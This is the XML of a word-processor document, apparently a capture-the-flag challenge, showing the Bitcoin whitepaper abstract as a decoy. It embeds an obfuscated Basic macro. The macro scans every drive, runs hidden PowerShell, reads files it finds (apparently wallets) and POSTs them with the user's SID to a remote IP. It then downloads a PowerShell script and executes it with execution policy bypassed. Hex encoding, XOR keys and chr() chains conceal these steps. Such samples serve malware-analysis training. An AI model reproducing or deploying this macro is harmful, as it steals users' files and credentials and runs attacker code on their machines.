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Library1/Module1.xml" manifest:media-type="text/xml"/>
  <manifest:file-entry manifest:full-path="Basic/Library1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Library1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Library1.Module1.Main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monospace" svg:font-family="monospac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db879" officeooo:paragraph-rsid="005bc69e"/>
    </style:style>
    <style:style style:name="P2" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="000679a9" officeooo:paragraph-rsid="000679a9"/>
    </style:style>
    <style:style style:name="P3" style:family="paragraph" style:parent-style-name="Standard" style:master-page-name="">
      <loext:graphic-properties draw:fill="none"/>
      <style:paragraph-properties fo:margin-left="0.5618in" fo:margin-right="0.5in" fo:text-align="justify" style:justify-single-word="false" fo:text-indent="0in" style:auto-text-indent="false" style:page-number="auto" fo:background-color="transparent"/>
      <style:text-properties style:font-name="Arial" officeooo:rsid="002db879" officeooo:paragraph-rsid="005bc69e"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties style:font-name="serif" fo:font-size="11.5pt"/>
    </style:style>
    <style:style style:name="T2" style:family="text">
      <style:text-properties style:font-name="serif" fo:font-size="8pt"/>
    </style:style>
    <style:style style:name="T3" style:family="text">
      <style:text-properties style:font-name="serif" fo:font-size="7.5pt"/>
    </style:style>
    <style:style style:name="T4" style:family="text">
      <style:text-properties style:font-name="serif" fo:font-size="20pt" style:font-size-asian="20pt" style:font-size-complex="20pt"/>
    </style:style>
    <style:style style:name="T5" style:family="text">
      <style:text-properties style:font-name="serif" fo:font-size="12pt" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T6" style:family="text">
      <style:text-properties style:font-name="serif" fo:font-size="11pt" style:font-size-asian="11pt" style:font-size-complex="11pt"/>
    </style:style>
    <style:style style:name="T7" style:family="text">
      <style:text-properties style:font-name="serif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/>
    </style:style>
    <style:style style:name="T13" style:family="text">
      <style:text-properties style:font-name="Arial" fo:font-size="20pt" style:font-size-asian="20pt" style:font-size-complex="20pt"/>
    </style:style>
    <style:style style:name="T14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Bitcoin: A Peer-to-Peer Electronic Cash System</text:span><text:span text:style-name="T12"><text:line-break/></text:span><text:span text:style-name="T14">Satoshi Nakamoto<text:line-break/>satoshin@gmx.com<text:line-break/></text:span><text:a xlink:type="simple" xlink:href="http://www.bitcoin.org/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T14">www.bitcoin.org</text:span></text:a></text:p>
      <text:p text:style-name="P3"><text:line-break/><text:span text:style-name="T11">Abstract</text:span><text:span text:style-name="T10">. A purely peer-to-peer version of electronic cash would allow online<text:line-break/>payments to be sent directly from one party to another without going through a<text:line-break/>financial institution. Digital signatures provide part of the solution, but the main<text:line-break/>benefits are lost if a trusted third party is still required to prevent double-spending.<text:line-break/>We propose a solution to the double-spending problem using a peer-to-peer network.<text:line-break/>The network timestamps transactions by hashing them into an ongoing chain of<text:line-break/>hash-based proof-of-work, forming a record that cannot be changed without redoing<text:line-break/>the proof-of-work. The longest chain not only serves as proof of the sequence of<text:line-break/>events witnessed, but proof that it came from the largest pool of CPU power. As<text:line-break/>long as a majority of CPU power is controlled by nodes that are not cooperating to<text:line-break/>attack the network, they'll generate the longest chain and outpace attackers. The<text:line-break/>network itself requires minimal structure. Messages are broadcast on a best effort<text:line-break/>basis, and nodes can leave and rejoin the network at will, accepting the longest<text:line-break/>proof-of-work chain as proof of what happened while they were gon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monospace" svg:font-family="monospac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1T00:38:20.794638045</meta:creation-date>
    <dc:date>2022-01-24T19:48:01.202000000</dc:date>
    <meta:editing-duration>PT7H38M56S</meta:editing-duration>
    <meta:editing-cycles>5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190" meta:character-count="1228" meta:non-whitespace-character-count="1038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' SK-CERT{h3ll4_3v1l_m4cr0}
Dim e82120f6eb877385243aae15d92e7e641 As String
Dim r81643b7f624a34b70d8ee428e5759613 As String
Dim n47f919f310871c4bfd51cf0709ca166d As String
Dim y421397a92abea5ac103badbf0fbf92bc As String
Dim b1f180003f7ceaef3db1c314f23e4d02f As Integer
Dim t8952b08f7910617055c3fad1f50f57d4() As String
Dim n39e679f588e34f4d95d0be86d9db053b As Integer
n47f919f310871c4bfd51cf0709ca166d = "27 36 1C 13 2A 22 2F 37 2D 21 58 58 1B 08 05 22 38 2E 18 02 21 3D 22 72 29 24 1C 11 09 0F 4B 66 7A 3A 04 1B 35 30 29 36 61 0A 3D 21 41 22 23 0F 1B 1D 22 22 1D 1C 67 7F 11 2C 0C 1D 4C"
y421397a92abea5ac103badbf0fbf92bc = "77 74 39 13 3B 24 35 21 24 6D 55 1C 02 02 07 33 33 3C 4B 23 0C 12 6A 7F 6B 61 52 02 0D 0D 07 23 23 73 47 5C 68 29 1C 33 6C 2B 39 58 2A 51 46 7F 0A 73 4B 0A 78 74 67 29 61 69 27 5B 2A 14 07 2A 19 38 06 13 78 2C 67 71 61 1E 33 58 2F 24 39 12 2C 2E 58 29 2F 65 29 26 1E 3E 48 18 5F 3E 1C 72 3B 35 58 02 6D 2C"
r81643b7f624a34b70d8ee428e5759613 = "WYkvXQGRAMxulakF"
n47f919f310871c4bfd51cf0709ca166d = tef891184c4e4eb93f9dfc49ef3ef1a3d(n47f919f310871c4bfd51cf0709ca166d)
nb10e22222b650a986497e7bd70ae44d7(n47f919f310871c4bfd51cf0709ca166d, r81643b7f624a34b70d8ee428e5759613)
y421397a92abea5ac103badbf0fbf92bc = tef891184c4e4eb93f9dfc49ef3ef1a3d(y421397a92abea5ac103badbf0fbf92bc)
nb10e22222b650a986497e7bd70ae44d7(y421397a92abea5ac103badbf0fbf92bc, r81643b7f624a34b70d8ee428e5759613)
For i = 65 To 90
b785a6ee17ac0dc3c19e0ceeee71121b8 = ""
neba0332859988d63228be9264038544f = ""
b785a6ee17ac0dc3c19e0ceeee71121b8 = chr(i) &amp; ":\"
neba0332859988d63228be9264038544f = Dir(b785a6ee17ac0dc3c19e0ceeee71121b8, vbDirectory)
If neba0332859988d63228be9264038544f = "" Then
Else
n39e679f588e34f4d95d0be86d9db053b = 0
xefc930b38ecd11d422d911ed10897c1f = "powershell -windowstyle hidden  -command Get-LocalUser -Name $env:USERNAME | Select sid"
e82120f6eb877385243aae15d92e7e641 = CreateObject("WScript.Shell").Exec(xefc930b38ecd11d422d911ed10897c1f).StdOut.ReadAll
nd97986fdd077e026409f51bd276388f5 = b785a6ee17ac0dc3c19e0ceeee71121b8 &amp; "Windows"
neba0332859988d63228be9264038544f = Dir(nd97986fdd077e026409f51bd276388f5, vbDirectory)
If neba0332859988d63228be9264038544f = "" Then
xefc930b38ecd11d422d911ed10897c1f = n47f919f310871c4bfd51cf0709ca166d &amp; b785a6ee17ac0dc3c19e0ceeee71121b8 &amp; y421397a92abea5ac103badbf0fbf92bc
Else
xefc930b38ecd11d422d911ed10897c1f = n47f919f310871c4bfd51cf0709ca166d &amp; b785a6ee17ac0dc3c19e0ceeee71121b8 &amp; "Users\" &amp; y421397a92abea5ac103badbf0fbf92bc
n39e679f588e34f4d95d0be86d9db053b = 1
End If
n6ffaff2c74a594fd2862378875a20cde = CreateObject("WScript.Shell").Exec(xefc930b38ecd11d422d911ed10897c1f).StdOut.ReadAll
If n6ffaff2c74a594fd2862378875a20cde = "" Then
Else
Set b8777db0116f745e22a3374df7393d3d6 = CreateObject("MSXML2.ServerXMLHTTP")
Dim nc6508627a975608356e338bf4c61a565 As String
t8952b08f7910617055c3fad1f50f57d4 = Split(n6ffaff2c74a594fd2862378875a20cde, chr(13))
For x = LBound(t8952b08f7910617055c3fad1f50f57d4()) To UBound(t8952b08f7910617055c3fad1f50f57d4())
If zf9fe9090897bc571f34a3d710c5a0c6c(t8952b08f7910617055c3fad1f50f57d4(x)) = "" Then
Else
b1f180003f7ceaef3db1c314f23e4d02f = FreeFile
Open zf9fe9090897bc571f34a3d710c5a0c6c(t8952b08f7910617055c3fad1f50f57d4(x)) For Input As #b1f180003f7ceaef3db1c314f23e4d02f
y990d03aa6db9942cb5dc481ad97309fb = ""
While Not EOF(b1f180003f7ceaef3db1c314f23e4d02f)
Line Input #b1f180003f7ceaef3db1c314f23e4d02f, DataLine
y990d03aa6db9942cb5dc481ad97309fb = y990d03aa6db9942cb5dc481ad97309fb &amp; chr(13) &amp; DataLine
Wend
y990d03aa6db9942cb5dc481ad97309fb = y990d03aa6db9942cb5dc481ad97309fb &amp; e82120f6eb877385243aae15d92e7e641
y990d03aa6db9942cb5dc481ad97309fb = y990d03aa6db9942cb5dc481ad97309fb &amp; chr(13) &amp; chr(83) &amp; chr(75) &amp; chr(45) &amp; chr(67) &amp; chr(69) &amp; chr(82) &amp; chr(84) &amp; chr(123) &amp; chr(119) &amp; chr(104) &amp; chr(51) &amp; chr(114) &amp; chr(101) &amp; chr(95) &amp; chr(109) &amp; chr(121) &amp; chr(95) &amp; chr(99) &amp; chr(114) &amp; chr(121) &amp; chr(112) &amp; chr(116) &amp; chr(48) &amp; chr(95) &amp; chr(103) &amp; chr(48) &amp; chr(51) &amp; chr(115) &amp; chr(125)
bea2b19e869d906e19c2c5845ef99d624 = chr(104)+ chr(116)+ chr(116)+ chr(112)+ chr(58)+ chr(47)+ chr(47)+ chr(49)+ chr(57)+ chr(56)+ chr(46)+ chr(49)+ chr(56)+ chr(46)+ chr(55)+ chr(46)+ chr(52)+ chr(52)+ chr(58)+ chr(56)+ chr(48)+ chr(48)+ chr(48)+ chr(47)+ chr(119)+ chr(97)+ chr(108)+ chr(108)+ chr(101)+ chr(116)+ chr(46)+ chr(112)+ chr(104)+ chr(112)
b8777db0116f745e22a3374df7393d3d6.Open "POST", bea2b19e869d906e19c2c5845ef99d624, False
b8777db0116f745e22a3374df7393d3d6.setRequestHeader "User-Agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"
b8777db0116f745e22a3374df7393d3d6.send(y990d03aa6db9942cb5dc481ad97309fb)
t6449198e0384c06d719c5cc8e9d0f432 = b8777db0116f745e22a3374df7393d3d6.responseText
Close #b1f180003f7ceaef3db1c314f23e4d02f
End If
Next x
If n39e679f588e34f4d95d0be86d9db053b = 1 Then
EncodedData = "51 32 32 102 10 103 65 65 102 199 10 32 8 396 11 13 17 23 12 4 65 9 199 106 65 32 58 1179 9 1277 1144 7 68 5922 86 7457 34 45 49 118 46 18719 1732 18 4 68 12811 386 16 13 25 12811 18 33 12811 4 1379 5 106 1379 9 68 18774"
bea2b19e869d906e19c2c5845ef99d624 = chr(104)+ chr(116)+ chr(116)+ chr(112)+ chr(58)+ chr(47)+ chr(47)+ chr(112)+ chr(104)+ chr(114)+ chr(97)+ chr(99)+ chr(107)+ chr(46)+ chr(111)+ chr(114)+ chr(103)+ chr(47)+ chr(105)+ chr(115)+ chr(115)+ chr(117)+ chr(101)+ chr(115)+ chr(47)+ chr(55)+ chr(48)+ chr(47)+ chr(53)+ chr(46)+ chr(104)+ chr(116)+ chr(109)+ chr(108)
b8777db0116f745e22a3374df7393d3d6.Open "GET", bea2b19e869d906e19c2c5845ef99d624, False
b8777db0116f745e22a3374df7393d3d6.setRequestHeader "User-Agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"
b8777db0116f745e22a3374df7393d3d6.send()
outputData = b8777db0116f745e22a3374df7393d3d6.responseText
bea2b19e869d906e19c2c5845ef99d624 = ""
t8952b08f7910617055c3fad1f50f57d4 = Split(EncodedData, " ")
For m = LBound(t8952b08f7910617055c3fad1f50f57d4()) To UBound(t8952b08f7910617055c3fad1f50f57d4())
bea2b19e869d906e19c2c5845ef99d624 = bea2b19e869d906e19c2c5845ef99d624 &amp; Mid(outputData, t8952b08f7910617055c3fad1f50f57d4(m), 1)
Next m
bea2b19e869d906e19c2c5845ef99d624 = split(bea2b19e869d906e19c2c5845ef99d624,"#")(0)
b8777db0116f745e22a3374df7393d3d6.Open "GET", bea2b19e869d906e19c2c5845ef99d624, False
b8777db0116f745e22a3374df7393d3d6.send()
Dim fso as Object
Set fso = CreateObject("Scripting.FileSystemObject")
Dim y0ba683a132bc63644c724ab7e1b8ca39 as Object
Set y0ba683a132bc63644c724ab7e1b8ca39 = FSO.CreateTextFile(b785a6ee17ac0dc3c19e0ceeee71121b8 &amp; "Users\Public\Documents\script.ps1")
y0ba683a132bc63644c724ab7e1b8ca39.WriteLine b8777db0116f745e22a3374df7393d3d6.responseText
y0ba683a132bc63644c724ab7e1b8ca39.Close
Set fso = Nothing
Set y0ba683a132bc63644c724ab7e1b8ca39 = Nothing
xefc930b38ecd11d422d911ed10897c1f = "powershell -windowstyle hidden -ExecutionPolicy Bypass -File " &amp; b785a6ee17ac0dc3c19e0ceeee71121b8 &amp; "Users\Public\Documents\script.ps1"
CreateObject("WScript.Shell").Exec(xefc930b38ecd11d422d911ed10897c1f)
End If
End If
End If
Next i
End Sub
Private Sub zf9fe9090897bc571f34a3d710c5a0c6c(strSource As String) As String
Dim i As Integer
Dim wa222f653e80d44592e6ae3a3c9b841d0 As String
For i = 1 To Len(strSource)
Select Case Asc(Mid(strSource, i, 1))
Case 32 To 126:
wa222f653e80d44592e6ae3a3c9b841d0 = wa222f653e80d44592e6ae3a3c9b841d0 &amp; Mid(strSource, i, 1)
End Select
Next
zf9fe9090897bc571f34a3d710c5a0c6c = wa222f653e80d44592e6ae3a3c9b841d0
End Sub
Private Sub tef891184c4e4eb93f9dfc49ef3ef1a3d(ByVal HexToStr As String) As String
Dim b0ec00fea928e2c2fab85507ac6b23ced   As String
Dim t3fe9cf8bc7672f0b96988be5acd6b68c As String
Dim I         As Long
For I = 1 To Len(HexToStr) Step 3
b0ec00fea928e2c2fab85507ac6b23ced = Chr$(Val("&amp;H" &amp; Mid$(HexToStr, I, 2)))
t3fe9cf8bc7672f0b96988be5acd6b68c = t3fe9cf8bc7672f0b96988be5acd6b68c &amp; b0ec00fea928e2c2fab85507ac6b23ced
Next I
tef891184c4e4eb93f9dfc49ef3ef1a3d = t3fe9cf8bc7672f0b96988be5acd6b68c
End Sub
Private Sub nb10e22222b650a986497e7bd70ae44d7(ByRef Text As String, ByRef r81643b7f624a34b70d8ee428e5759613 As String)
Dim l As Long
Dim lonLenKey As Long
Dim lonKeyPos As Long
lonLenKey = Len(r81643b7f624a34b70d8ee428e5759613)
For l = 1 To Len(Text)
lonKeyPos = lonKeyPos + 1
If lonKeyPos &gt; lonLenKey Then lonKeyPos = 1
Mid$(Text, l, 1) = Chr$(Asc(Mid$(Text, l, 1)) Xor Asc(Mid$(r81643b7f624a34b70d8ee428e5759613, lonKeyPos, 1)))
Next l
End Sub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